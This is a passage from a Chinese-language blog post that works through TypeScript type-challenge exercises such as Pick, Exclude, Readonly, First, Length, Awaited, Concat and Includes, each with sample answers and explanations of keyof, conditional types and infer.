class="string">&quot;completed&quot;</span>&gt;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> <span class="attr">todo</span>: <span class="title class_">TodoPreview</span> = &#123;</span><br><span class="line">  <span class="attr">title</span>: <span class="string">&quot;Clean room&quot;</span>,</span><br><span class="line">  <span class="attr">completed</span>: <span class="literal">false</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>答案：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">MyPick</span>&lt;T, K <span class="keyword">extends</span> keyof T&gt; = &#123;</span><br><span class="line">  [key <span class="keyword">in</span> K]: T[key]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解析 ：</p><p><code>keyof T</code> 可以将目标类型的 Key 全部提取出来，以上面的示例为例，<code>keyof T</code> 的结果就是 <code>&quot;title&quot; | &quot;description&quot; | &quot;completed&quot;</code>；</p><p><code>extends</code> 是 TypeScript 中的一个 <strong>操作类型</strong>，可以用作条件<a href="https://www.typescriptlang.org/docs/handbook/2/conditional-types.html">类型判断</a>，意思表述为 <code>extends</code> 左侧的类型可以赋给右侧的类型，如 <code>number extends (number | string) ? number : string // number</code>。在上述示例中，<code>K extends keyof T</code> 就表示为 <code>K</code> 是 <code>&quot;title&quot; | &quot;description&quot; | &quot;completed&quot;</code> 其中的一个值；</p><p><code>in</code> 关键词可以帮助我们在定义对象的 key 值时从联合类型中进行取值，如我们想创建一个 Object 的类型声明，该对象的值不限定类型，然而 key 值我们期望限定范围在 <code>&#39;a&#39; | &#39;b&#39; | &#39;c&#39;</code>，那么我们就可以声明该对象的类型为 <code>type Obj = &#123; [key in &#39;a&#39; | &#39;b&#39; | &#39;c&#39;]: string &#125;</code>（如果 key 值也不限定类型，可以直接声明为 <code>&#123; [key: string]: any &#125;</code> 等同于 <code>Record&lt;string, any&gt;</code>）;</p><p>因此，使用 <code>K extends keyof T</code> 可以限定泛型的第二个参数位必须传入目标对象的 key，使用 <code>[key in K]: T[key]</code> 来定义一个新的类型声明对象的 Key 和 Value 的类型定义，从而实现 <code>Pick</code> 函数。</p><h2 id="Exclude"><a href="#Exclude" class="headerlink" title="Exclude"></a>Exclude</h2><p><a href="https://github.com/type-challenges/type-challenges/blob/main/questions/00043-easy-exclude/README.zh-CN.md">Source</a></p><p><code>Exclude</code> 是   TypeScript 中的一个内置工具类型，可以排除掉某个联合类型中的某些联合成员，例如 <code>Exclude&lt;&quot;a&quot; | &quot;b&quot; | &quot;c&quot;, &quot;c&quot; | &quot;d&quot;&gt;</code> 将得到新的联合类型 <code>&quot;a&quot; | &quot;b&quot;</code>。</p><p> 答案：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">MyExclude</span>&lt;T, K&gt; = T <span class="keyword">extends</span> K ? <span class="built_in">never</span> : T;</span><br></pre></td></tr></table></figure><p>解析：</p><p>这里利用到了 TypeScript 的 <code>extends</code> 关键字，并且利用到了其<a href="https://www.typescriptlang.org/docs/handbook/2/conditional-types.html#distributive-conditional-types">自动分配条件的特性</a>。简单来说，对于 <code>T extends U ? X : Y</code> 来说，当 <code>T</code> 为一个 <code>A | B</code> 的联合类型，那实际情况就变成 <code>(A extends U ? X : Y) | (B extends U ? X : Y)</code>。</p><p>且这一特性仅在左侧为泛型时才会触发，当使用 <code>&quot;a&quot; | &quot;b&quot; | &quot;c&quot; extends &quot;a&quot; ? &quot;e&quot; : &quot;f&quot;</code>  时得到的结果为 <code>&quot;f&quot;</code> 并非 <code>&quot;e&quot; | &quot;f&quot;</code>，因为 <code>&quot;a&quot; | &quot;b&quot; | &quot;c&quot;</code> 并不能分配给 <code>&quot;a&quot;</code>。如果在使用泛型时候不想触发自动分配条件的特性，可以使用 <code>[]</code> 将关键词左侧和右侧包裹起来，如 <code>[T] extends [K]</code>。</p><h2 id="实现对象属性只读"><a href="#实现对象属性只读" class="headerlink" title="实现对象属性只读"></a>实现对象属性只读</h2><p><a href="https://github.com/type-challenges/type-challenges/blob/main/questions/00007-easy-readonly/README.zh-CN.md">Source</a></p><p>Readonly 是 TypeScript 中的一个内置工具类型，可以将对象类型的所有属性都设置为只读，这意味着构造类型的属性不能重新分配，如：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Todo</span> &#123;</span><br><span class="line">  <span class="attr">title</span>: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> <span class="attr">todo</span>: <span class="title class_">Readonly</span>&lt;<span class="title class_">Todo</span>&gt; = &#123;</span><br><span class="line">  <span class="attr">title</span>: <span class="string">&quot;Delete inactive users&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line">todo.<span class="property">title</span> = <span class="string">&quot;Hello&quot;</span>; <span class="comment">// Cannot assign to &#x27;title&#x27; because it is a read-only property.</span></span><br></pre></td></tr></table></figure><p>答案：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">MyReadonly</span>&lt;T&gt; = &#123;</span><br><span class="line">  <span class="keyword">readonly</span> [K <span class="keyword">in</span> keyof T]: T[K]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解析：</p><p>TypeScript 在定义类型时，可以使用 <a href="https://www.typescriptlang.org/docs/handbook/typescript-in-5-minutes-func.html#readonly-and-const"><code>readonly</code> 修饰符</a> 将对象属性定义为只读属性，这里就可以通过重新声明对象类型的 key 类型来将其所有 key 都定义为只读类型。</p><p><a href="https://github.com/type-challenges/type-challenges/blob/main/questions/00008-medium-readonly-2/README.zh-CN.md">相同类型题目：对象部分属性只读</a></p><p>答案：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 方案一：</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">MyExclude</span>&lt;T, K&gt; = T <span class="keyword">extends</span> K ? <span class="built_in">never</span> : T;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">MyReadonly</span>&lt;T, K <span class="keyword">extends</span> keyof T = keyof T&gt; = &#123;</span><br><span class="line">  <span class="keyword">readonly</span> [k <span class="keyword">in</span> K]: T[k];</span><br><span class="line">&#125; &amp; &#123; [k <span class="keyword">in</span> <span class="title class_">MyExclude</span>&lt;keyof T, K&gt;]: T[k] &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方案二：</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">MyReadonly2</span>&lt;T, K <span class="keyword">extends</span> keyof T = keyof T&gt; = <span class="title class_">Omit</span>&lt;T, K&gt; &amp;</span><br><span class="line">  <span class="title class_">Readonly</span>&lt;<span class="title class_">Pick</span>&lt;T, K&gt;&gt;;</span><br></pre></td></tr></table></figure><p><a href="https://github.com/type-challenges/type-challenges/blob/main/questions/00009-medium-deep-readonly/README.zh-CN.md">相同类型题目：对象属性只读（递归）</a></p><p>答案：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">DeepReadonly</span>&lt;T&gt; = keyof T <span class="keyword">extends</span> <span class="built_in">never</span></span><br><span class="line">  ? T</span><br><span class="line">  : &#123; <span class="keyword">readonly</span> [k <span class="keyword">in</span> keyof T]: <span class="title class_">DeepReadonly</span>&lt;T[k]&gt; &#125;;</span><br></pre></td></tr></table></figure><h2 id="元组转换为对象"><a href="#元组转换为对象" class="headerlink" title="元组转换为对象"></a>元组转换为对象</h2><p>将一个元组类型转换为对象类型，这个对象类型的键/值和元组中的元素对应。</p><p>例如：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> tuple = [<span class="string">&#x27;tesla&#x27;</span>, <span class="string">&#x27;model 3&#x27;</span>, <span class="string">&#x27;model X&#x27;</span>, <span class="string">&#x27;model Y&#x27;</span>] <span class="keyword">as</span> <span class="keyword">const</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> result = <span class="title class_">TupleToObject</span>&lt;<span class="keyword">typeof</span> tuple&gt; <span class="comment">// expected &#123; &#x27;tesla&#x27;: &#x27;tesla&#x27;, &#x27;model 3&#x27;: &#x27;model 3&#x27;, &#x27;model X&#x27;: &#x27;model X&#x27;, &#x27;model Y&#x27;: &#x27;model Y&#x27;&#125;</span></span><br></pre></td></tr></table></figure><p>答案：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">TupleToObject</span>&lt;T <span class="keyword">extends</span> <span class="keyword">readonly</span> <span class="built_in">any</span>[]&gt; = &#123;</span><br><span class="line">  [K <span class="keyword">in</span> T[<span class="built_in">number</span>]]: K</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解析：</p><p>我们要求传入的泛型 <code>T</code> 必须是数组，因此要求继承为 <code>any[]</code>，同时在题目示例中，我们使用 <code>typeof tuple</code> 来获取元组的类型，这样获取到的是一个 readonly 属性的元组，因此 T 必须继承 <code>readonly any[]</code>。</p><p>当 <code>T</code> 为元组时，可以使用 <code>T[number]</code> 将元组转化为一个联合类型，如 <code>[&quot;a&quot;, &quot;b&quot;, &quot;c&quot;][number]</code> 即为 <code>&quot;a&quot; | &quot;b&quot; | &quot;c&quot;</code>。<code>[K in T[number]]: K</code> 可以将元组转化为 <code>Key: Value</code> 对应的形式。</p><h2 id="第一个元素"><a href="#第一个元素" class="headerlink" title="第一个元素"></a>第一个元素</h2><p>实现一个<code>First&lt;T&gt;</code>泛型，它接受一个数组<code>T</code>并返回它的第一个元素的类型。</p><p>例如：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> arr1 = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>]</span><br><span class="line"><span class="keyword">type</span> arr2 = [<span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> head1 = <span class="title class_">First</span>&lt;arr1&gt; <span class="comment">// 应推导出 &#x27;a&#x27;</span></span><br><span class="line"><span class="keyword">type</span> head2 = <span class="title class_">First</span>&lt;arr2&gt; <span class="comment">// 应推导出 3</span></span><br></pre></td></tr></table></figure><p>答案：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//answer1</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">First</span>&lt;T <span class="keyword">extends</span> <span class="built_in">any</span>[]&gt; = T <span class="keyword">extends</span> [] ? <span class="built_in">never</span> : T[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">//answer2</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">First</span>&lt;T <span class="keyword">extends</span> <span class="built_in">any</span>[]&gt; = T[<span class="string">&#x27;length&#x27;</span>] <span class="keyword">extends</span> <span class="number">0</span> ? <span class="built_in">never</span> : T[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">//answer3</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">First</span>&lt;T <span class="keyword">extends</span> <span class="built_in">any</span>[]&gt; = T <span class="keyword">extends</span> [infer A, ...infer <span class="title class_">Rest</span>] ? A : <span class="built_in">never</span></span><br></pre></td></tr></table></figure><p>解析：</p><p>这道题看似很简单，只需要 <code>T[0]</code> 就可以获取到元组的第一个成员并返回，但是需要考虑用例为一个空元组的情况，比如 <code>First&lt;[]&gt;</code> 需要返回 <code>never</code>，而 <code>T[0]</code> 将返回 <code>undefined</code>。因此我们需要特殊处理该情况。</p><p>在第一种解法中，<code>T extends []</code> 相当于显式判断了 <code>T</code> 是否是一个空元组，如果是的话则直接返回 <code>never</code>。</p><p>第二种解法则是使用元组的 <code>length</code> 属性来判断元组是否为空，如果为空则返回 <code>never</code>。</p><p>第三种解法利用了关键词 <code>infer</code>，<code>infer</code> 可以用作类型推断，具体介绍可以查看<a href="https://jkchao.github.io/typescript-book-chinese/tips/infer.html#%E4%BB%8B%E7%BB%8D">这里</a>。<code>T extends [infer A, ...infer Rest]</code> 表示如果 <code>T</code> 如果可以赋给 <code>[infer A, ...infer Rest]</code> 那么元组的第一个成员为泛型 <code>A</code>，其余成员使用展开符赋给泛型 <code>Reset</code>，如 <code>T</code> 为 <code>[&quot;a&quot;, &quot;b&quot;, &quot;c&quot;]</code>，则 <code>A</code> 为 <code>&quot;a&quot;</code>，<code>Reset</code> 为 <code>[&quot;b&quot;, &quot;c&quot;]</code>。如果 <code>extends</code> 条件成立则返回 <code>A</code>，也就是元组中第一个元素的类型，如果不成立则说明 <code>infer</code> 无法推断，也就是说元组类型 <code>T</code> 的长度不足，因此返回 <code>never</code>。</p><h2 id="获取元组长度"><a href="#获取元组长度" class="headerlink" title="获取元组长度"></a>获取元组长度</h2><p>创建一个<code>Length</code>泛型，这个泛型接受一个只读的元组，返回这个元组的长度。</p><p>例如：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> tesla = [<span class="string">&#x27;tesla&#x27;</span>, <span class="string">&#x27;model 3&#x27;</span>, <span class="string">&#x27;model X&#x27;</span>, <span class="string">&#x27;model Y&#x27;</span>] <span class="keyword">as</span> <span class="keyword">const</span></span><br><span class="line"><span class="keyword">const</span> spaceX = [<span class="string">&#x27;FALCON 9&#x27;</span>, <span class="string">&#x27;FALCON HEAVY&#x27;</span>, <span class="string">&#x27;DRAGON&#x27;</span>, <span class="string">&#x27;STARSHIP&#x27;</span>, <span class="string">&#x27;HUMAN SPACEFLIGHT&#x27;</span>] <span class="keyword">as</span> <span class="keyword">const</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> teslaLength = <span class="title class_">Length</span>&lt;<span class="keyword">typeof</span> tesla&gt; <span class="comment">// expected 4</span></span><br><span class="line"><span class="keyword">type</span> spaceXLength = <span class="title class_">Length</span>&lt;<span class="keyword">typeof</span> spaceX&gt; <span class="comment">// expected 5</span></span><br></pre></td></tr></table></figure><p>答案：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// answer 1</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Length</span>&lt;T <span class="keyword">extends</span> <span class="keyword">readonly</span> <span class="built_in">any</span>[]&gt; = T[<span class="string">&#x27;length&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// answer 2</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Length</span>&lt;T <span class="keyword">extends</span> <span class="keyword">readonly</span> <span class="built_in">any</span>[]&gt; = T <span class="keyword">extends</span> &#123; <span class="attr">length</span>: infer L &#125;  ?  L : <span class="built_in">never</span>;</span><br></pre></td></tr></table></figure><p>解析：</p><p>用例中使用 <code>typeof</code> 来获取一个 const 常量的类型，因此泛型 <code>T</code> 要继承 <code>readonly</code> 只读类型的数组，否则用例会报错。</p><p>在元组类型中，与 JavaScript 数组一样的，都存在一个 <code>length</code> 属性，表示元组的长度。解法一直接取 <code>length</code> 属性，而解法二则是使用了 <code>infer</code> 推断的方式返回了推断值。</p><h2 id="Awaited"><a href="#Awaited" class="headerlink" title="Awaited"></a>Awaited</h2><p>假如我们有一个 Promise 对象，这个 Promise 对象会返回一个类型。在 TS 中，我们用 Promise 中的 <code>T</code> 来描述这个 Promise 返回的类型。请你实现一个类型，可以获取这个类型。</p><p>例如：<code>Promise&lt;ExampleType&gt;</code>，请你返回 ExampleType 类型。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">ExampleType</span> = <span class="title class_">Promise</span>&lt;<span class="built_in">string</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Result</span> = <span class="title class_">MyAwaited</span>&lt;<span class="title class_">ExampleType</span>&gt; <span class="comment">// string</span></span><br></pre></td></tr></table></figure><blockquote><p>在 TypeScript 4.5 中已经内置了 <code>Awaited</code> 方法类型。</p></blockquote><p>答案：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">MyAwaited</span>&lt;T <span class="keyword">extends</span> <span class="title class_">PromiseLike</span>&lt;<span class="built_in">any</span>&gt;&gt; = T <span class="keyword">extends</span> <span class="title class_">PromiseLike</span>&lt;infer U&gt;</span><br><span class="line">  ? U <span class="keyword">extends</span> <span class="title class_">PromiseLike</span>&lt;<span class="built_in">any</span>&gt;</span><br><span class="line">    ? <span class="title class_">MyAwaited</span>&lt;U&gt;</span><br><span class="line">    : U</span><br><span class="line">  : <span class="built_in">never</span>;</span><br></pre></td></tr></table></figure><p>解析：</p><p>已知的，泛型 <code>T</code> 必须继承 Promise 类，因此使用 <code>T extends Promise&lt;any&gt;</code> 限制泛型 <code>T</code> 的类型。然后使用 <code>infer</code> 推断 Promise 返回的具体类型，如果 <code>extends</code> 为真则返回推断值，否则表示无法推断则返回 <code>never</code>，因此我们可以将 <code>MyAwait</code> 编写为：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">MyAwait</span>&lt;T <span class="keyword">extends</span> <span class="title class_">Promise</span>&lt;<span class="built_in">any</span>&gt;&gt; = T <span class="keyword">extends</span> <span class="title class_">Promise</span>&lt;infer U&gt; ? U : <span class="built_in">never</span></span><br></pre></td></tr></table></figure><p>但是这样只能推断一层 Promise，我们题目中要求的是可以推断多层 Promise 的最终返回值，例如用例 <code>type Z1 = Promise&lt;Promise&lt;Promise&lt;string | boolean&gt;&gt;&gt;</code>，<code>MyAwait&lt;Z1&gt;</code> 需要返回 <code>string | boolean</code>。因此我们需要使用递归判断推断值 <code>U</code> 是否仍是一个 Promise 对象，如果是的话则使用 <code>MyAwaited</code> 对其进行递归调用，因此我们继续完善答案：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">MyAwaited</span>&lt;T <span class="keyword">extends</span> <span class="title class_">Promise</span>&lt;<span class="built_in">any</span>&gt;&gt; = T <span class="keyword">extends</span> <span class="title class_">Promise</span>&lt;infer U&gt;</span><br><span class="line">  ? U <span class="keyword">extends</span> <span class="title class_">Promise</span>&lt;<span class="built_in">any</span>&gt;</span><br><span class="line">    ? <span class="title class_">MyAwaited</span>&lt;U&gt;</span><br><span class="line">    : U</span><br><span class="line">  : <span class="built_in">never</span>;</span><br></pre></td></tr></table></figure><p>但是对于用例 <code>type T = &#123; then: (onfulfilled: (arg: number) =&gt; any) =&gt; any &#125;</code>，套用上面的 <code>MyAwait</code> 会报错，因为它不是一个标准的 Promise 对象，这时候就需要使用 <code>PromiseLike</code>。</p><p><code>PromiseLike</code> 是  TypeScript 内置的一个 Promise 的 DuckType（看起来像但不是）。这是因为在 ES6 的标准 Promise 对象出现前就已经有了 Promise 的相关概念，如 <a href="https://wiki.commonjs.org/wiki/Promises/A">Promise/A</a>。因此 TypeScript 提供了一个 <code>PromiseLike</code> 类型方便开发者使用给遵循了 Promise 标准但并不是 ES6 中的标准 Promise 的对象使用，因此最终的答案为：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">MyAwaited</span>&lt;T <span class="keyword">extends</span> <span class="title class_">Promise</span>&lt;<span class="built_in">any</span>&gt;&gt; = T <span class="keyword">extends</span> <span class="title class_">Promise</span>&lt;infer U&gt;</span><br><span class="line">  ? U <span class="keyword">extends</span> <span class="title class_">Promise</span>&lt;<span class="built_in">any</span>&gt;</span><br><span class="line">    ? <span class="title class_">MyAwaited</span>&lt;U&gt;</span><br><span class="line">    : U</span><br><span class="line">  : <span class="built_in">never</span>;</span><br></pre></td></tr></table></figure><h2 id="If"><a href="#If" class="headerlink" title="If"></a>If</h2><p>实现一个 <code>IF</code> 类型，它接收一个条件类型 <code>C</code> ，一个判断为真时的返回类型 <code>T</code> ，以及一个判断为假时的返回类型 <code>F</code>。 <code>C</code> 只能是 <code>true</code> 或者 <code>false</code>， <code>T</code> 和 <code>F</code> 可以是任意类型。</p><p>例如：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> A = <span class="title class_">If</span>&lt;<span class="literal">true</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>&gt;  <span class="comment">// expected to be &#x27;a&#x27;</span></span><br><span class="line"><span class="keyword">type</span> B = <span class="title class_">If</span>&lt;<span class="literal">false</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>&gt; <span class="comment">// expected to be &#x27;b&#x27;</span></span><br></pre></td></tr></table></figure><p>答案：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">If</span>&lt;C <span class="keyword">extends</span> <span class="built_in">boolean</span>, T, F&gt; = C <span class="keyword">extends</span> <span class="literal">true</span> ? T : F</span><br></pre></td></tr></table></figure><h2 id="Concat"><a href="#Concat" class="headerlink" title="Concat"></a>Concat</h2><p><a href="https://github.com/type-challenges/type-challenges/blob/main/questions/00533-easy-concat/README.zh-CN.md">Source</a></p><p>在类型系统里实现 JavaScript 内置的 <code>Array.concat</code> 方法，这个类型接受两个参数，返回的新数组类型应该按照输入参数从左到右的顺序合并为一个新的数组。</p><p>例如：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Result</span> = <span class="title class_">Concat</span>&lt;[<span class="number">1</span>], [<span class="number">2</span>]&gt; <span class="comment">// expected to be [1, 2]</span></span><br></pre></td></tr></table></figure><p>答案：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Concat</span>&lt;T <span class="keyword">extends</span> <span class="keyword">readonly</span> <span class="built_in">any</span>[], U <span class="keyword">extends</span> <span class="keyword">readonly</span> <span class="built_in">any</span>[]&gt; = [...T, ...U];</span><br></pre></td></tr></table></figure><p>解析：</p><p>TypeScript 的类型声明中，<code>...</code> 展开运算符是可用的，因此只需要展开数组类型的泛型即可。但是要注意存在用例 <code>Expect&lt;Equal&lt;Concat&lt;typeof tuple, typeof tuple&gt;, [1, 1]&gt;&gt;</code>，因此要使用 <code>readonly</code>。</p><h2 id="Includes"><a href="#Includes" class="headerlink" title="Includes"></a>Includes</h2><p><a href="https://github.com/type-challenges/type-challenges/blob/main/questions/00898-easy-includes/README.zh-CN.md">Source</a></p><p>在类型系统里实现 JavaScript 的 <code>Array.includes</code> 方法，这个类型接受两个参数，返回的类型要么是 <code>true</code> 要么是 <code>false</code>。</p><p>例如：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> isPillarMen = <span class="title class_">Includes</span>&lt;[<span class="string">&#x27;Kars&#x27;</span>, <span class="string">&#x27;Esidisi&#x27;</span>, <span class="string">&#x27;Wamuu&#x27;</span>, <span class="string">&#x27;Santana&#x27;</span>], <span class="string">&#x27;Dio&#x27;</span>&gt; <span class="comment">// expected to be `false`</span></span><br></pre></td></tr></table></figure><p>答案：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">type</span> <span class="title class_">IsEqual</span>&lt;X, Y&gt; =</span><br><span class="line">    (&lt;T&gt;<span class="function">() =&gt;</span> T <span class="keyword">extends</span> X ? <span class="number">1</span> : <span class="number">2</span>) <span class="keyword">extends</span></span><br><span class="line">    (&lt;T&gt;<span class="function">() =&gt;</span> T <span class="keyword">extends</span> Y ? <span class="number">1</span> : <span class="number">2</span>) ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Includes</span>&lt;T <span class="keyword">extends</span> <span class="keyword">readonly</span> <span class="built_in">unknown</span>[], U&gt; =</span><br><span class="line">  T <span class="keyword">extends</span> [infer <span class="title class_">First</span>, ...infer <span class="title class_">Rest</span>]</span><br><span class="line">    ? <span class="title class_">Equal</span>&lt;<span class="title class_">First</span>, U&gt; <span class="keyword">extends</span> <span class="literal">true</span> ? <span class="literal">true</span> : <span class="title class_">Includes</span>&lt;<span class="title class_">Rest</span>, U&gt;</span><br><span class="line">    : <span class="literal">false</span>;</span><br></pre></td></tr></table></figure><p>解析 ：</p><p>看到这个题目我们可能首先会考虑将 <code>Includes</code> 的第一个参数位传入的元组转为联合类型，然后如果第二个参数的类型如果对于该联合类型的 <code>extends</code> 结果为真，则说明该类型包含于元组中，实现如下：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Includes</span>&lt;T <span class="keyword">extends</span> <span class="keyword">readonly</span> <span class="built_in">any</span>[], U&gt; = U <span class="keyword">extends</span> T[<span class="built_in">number</span>] ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br></pre></td></tr></table></figure><p>但我们编写的这个方法只能通过 <code>Includes&lt;[&#39;Kars&#39;, &#39;Esidisi&#39;, &#39;Wamuu&#39;, &#39;Santana&#39;], &#39;Dio&#39;&gt;</code> 这样的简单用例，对于稍微复杂的情况，比如元组中存在 <code>boolean</code> 这样的类型，那么 <code>false</code> 和 <code>true</code> 对于其的 <code>extends</code> 结果都未真，那么判断将会失败。亦或者是元组中存在 interface 类型，如 <code>Includes&lt;[&#123; readonly a: &#39;A&#39; &#125;], &#123; a: &#39;A&#39; &#125;&gt;</code> 则也无法正确判断（结果是 <code>true</code>，而预期值是 <code>false</code>）。</p><p>那么我们换一种思路，在不使用值对比的方式时，如果使用 JavaScript 编写数组的 includes 方法，我们可以构造一个 Map 的数据结构，将数组中所有的元素都作为 Map 的 key 值，然后查看目标值是否在 Map 上存在，如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">myIncludes</span>(<span class="params">arr, target</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> map = &#123;&#125;;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    map[arr[i]] = i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> map[target] !== <span class="literal">undefined</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们使用 TypeScript 的类型声明来实现这个方法，可以写为：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Includes</span>&lt;T <span class="keyword">extends</span> <span class="keyword">readonly</span> <span class="built_in">any</span>[], U&gt; = &#123;</span><br><span class="line">  [P <span 